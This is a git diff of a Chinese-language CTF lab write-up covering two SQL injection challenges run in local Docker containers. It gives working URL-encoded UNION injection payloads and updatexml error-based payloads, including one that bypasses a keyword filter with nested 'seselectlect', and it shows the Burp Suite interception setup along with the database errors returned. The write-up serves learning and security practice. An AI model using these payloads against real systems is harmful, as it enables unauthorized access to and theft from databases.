@@ -144,11 +144,14 @@ services:
       - 80:80
 ```
 1. 127.0.0.1/index.php?id=2-1 的结果与 127.0.0.1/index.php?id=2 相同，说明不存在数字型注入。
-2. 尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。
-3. 尝试 UNION 注入，127.0.0.1/index.php?id=-1%27%23union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。
-4. 尝试获取表明 127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23，得到 fl4g，notes 两个表。
-5. 分别尝试获取列名。127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23。在 fl4g 中获得 flag。
 
+2. 尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。
+  
+3. 尝试 UNION 注入，127.0.0.1/index.php?id=-1%27%23union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。
+  
+4. 尝试获取表明 127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23，得到 fl4g，notes 两个表。
+  
+5. 分别尝试获取列名。127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23。在 fl4g 中获得 flag。
 
 ### 1.2.2 SQL注入-2 
 docker-compose.yml
@@ -168,40 +171,54 @@ services:
 403   290B   http://127.0.0.1:80/server-status/
 200    11B   http://127.0.0.1:80/user.php
 ```
-2. 访问 http://127.0.0.1:80/login.php ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦
+
+2. 访问 http://127.0.0.1:80/login.php ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：`如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦`
+  
 3. 安装 burp suit 社区版
-> 下载链接：https://portswigger.net/burp/releases/professional-community-2021-2-1
-> 安装命令：sh burpsuite_community_linux_v2021_2_1.sh 
+  下载链接：https://portswigger.net/burp/releases/professional-community-2021-2-1
+  安装命令：`sh burpsuite_community_linux_v2021_2_1.sh` 
 
 4. 配置 burp suit
 > 1. 进入 Proxy ->  option，选择 add，端口用 8080，选择  Loopback only。
-> 2. 进入浏览器的 代理设置，http/https 代理均设为 127.0.0.1，端口 8080。
-![](../images/burp_proxy.png)
+> 2. 进入浏览器的代理设置，http/https 代理均设为 127.0.0.1，端口 8080。(与 burp 内设置的一致)
+![burp proxy](burp_proxy.png)
 
 5. 使用 burp suit 抓包、发包。
-> 进入 Proxy -> intercep。浏览器发出的包会先到 burp，可在 intercep 这行一系列对包的操作。
-![](../images/burp_intercept.png)
+> 进入 Proxy -> intercep 页面。如果浏览器与 burp 设置成功，浏览器发出的包会先到 burp，burp 中可对这个包执行修改、转发、丢弃等等操作。在 intercep 这行一系列对包的操作。
+![burp intercept](burp_intercept.png)
 
-6. 发现 burp 不会捕获 127.0.0.1 的流量。使用 `ifconfig` 命令找到主机的 ip，用主机 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1
+6. 火狐浏览器会自动周期性的发包，可先在火狐浏览器核心设置中取消这周期性的发包，具体发的包可以 burp 中 Proxy菜单下的 HTTP history 页面中看到。
+   
+7. burp 有时不会捕获 127.0.0.1 的流量。如果要捕获发至本机的包，使用 `ifconfig` 命令先找到本机的 ip，用本机的 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1。
 
-7. burp 捕获访问 http://172.19.0.1/login.php 的包（注意此处需要捕获的是点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：Send to Repeater（Ctrl + R），再进入 Repeater 页面。在 request 中修改请求头。根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123'（登录的用户名），成功返回 SQL 报错信息：
+8. burp 捕获访问 http://172.19.0.1/login.php 的包（注意此处需要捕获的是输入账号密码点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：`Send to Repeater（Ctrl + R）`，再进入 Repeater 页面。在 request 中修改请求头。
+   
+9.  根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123'（登录的用户名），成功返回 SQL 报错信息：
 > string(154) "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''123''' at line 1"
-> ![](../images/burp_login_request.png)
+> ![burp login request](burp_login_request.png)
 
-8. 可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：
-> name=123'or updatexml(1,concat(0x7e,(select(1)from dual)),1)#&pass=123
-> ![](../images/burp_request_select.png)
+10. 可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：
+> `name=123'or updatexml(1,concat(0x7e,(select(7,8,9)),0x7e),1)#&pass=123`
 
-9. 返回如下 SQL 错误，说明可能存在关键字的替换，尝试书中提到的常用防御手段，发现存在将SELECT替换成空的情况，于是使用嵌套 select，即 seselectlect 替换 select。
+    返回报错内容：string(34) "Operand should contain 1 column(s)"
+
+    可能只有1列，尝试 `name=123'or updatexml(1,concat(0x7e,(select(7)),0x7e),1)#&pass=123`
+
+    返回报错内容：`~7~`。确定格式。（0x7e：~ ）
+
+11. 使用完整 SQL 语句测试：`name=123'or updatexml(1,concat(0x7e,(select(7) from dual ),0x7e),1)#&pass=123`,返回如下 SQL 错误。根据报错信息，说明可能存在关键字的替换，最有可能替换的是 select ,于是使用嵌套 select，即 seselectlect 替换 select，再次成功返回信息`~7~`。
 > string(164) "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'from dual)),1)#'' at line 1"
 
-10. 返回如下信息，成功获得信息。(我们用的 select 1)
-> string(24) "XPATH syntax error: '~1'"
+12. 通过获取表名，列名成功获得 flag。
+```
+name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=database()) ,0x7e),1)#&pass=xxxx
 
-11. 通过 获取表名，列名成功获得 flag。
-```
-name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=database())),1)#&pass=xxxx
+string(34) "XPATH syntax error: '~fl4g,users~'"
 ```
 ```
-name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name='~fl4g')),1)#&pass=xxxx
+name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name='fl4g'),0x7e),1)#&pass=xxxx
+
+# 返回信息：string(28) "XPATH syntax error: '~flag~'"
 ```
+
+
